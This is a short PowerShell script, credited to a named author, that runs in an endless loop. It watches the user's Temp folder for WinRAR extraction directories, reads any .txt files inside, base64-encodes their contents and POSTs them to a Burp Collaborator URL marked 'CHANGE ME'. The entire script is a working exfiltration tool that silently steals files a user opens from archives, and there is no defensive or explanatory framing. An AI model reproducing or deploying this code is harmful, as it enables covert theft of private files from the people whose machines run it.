# Author: Abdullah Alqeisi
#asd

$temp = $env:Username
$temp = $temp.toCharArray()
$username = ""

foreach ($letter in $temp) {
 	if($letter -ne ' '){$username += $letter}
  	if($letter -eq ' '){break}
}

while(1) {

if(Get-ChildItem -Path C:\Users\$username\AppData\Local\Temp | Where-Object { $_.Name -match 'Rar.........\..' }){

	foreach ($directory in (Get-ChildItem -Path C:\Users\$username\AppData\Local\Temp | Where-Object { $_.Name -match 'Rar.........\..' })){

		foreach ($filename in Get-ChildItem -Path C:\Users\$username\AppData\Local\Temp\$directory\*.txt){

			$filecontent= Get-Content $filename
			$filecontentbytes = [System.Text.Encoding]::UTF8.GetBytes($filecontent)
			$B64EncodedContent = [System.Convert]::ToBase64String($filecontentbytes)

			$target = "https://fo70z55wxi56zxob33p9oiq8hznpbe.burpcollaborator.net"  #CHANGE ME
			$postParams = @{payload=$B64EncodedContent}
			Invoke-WebRequest -Uri $target -Method POST -Body $postParams

}

}

}

}


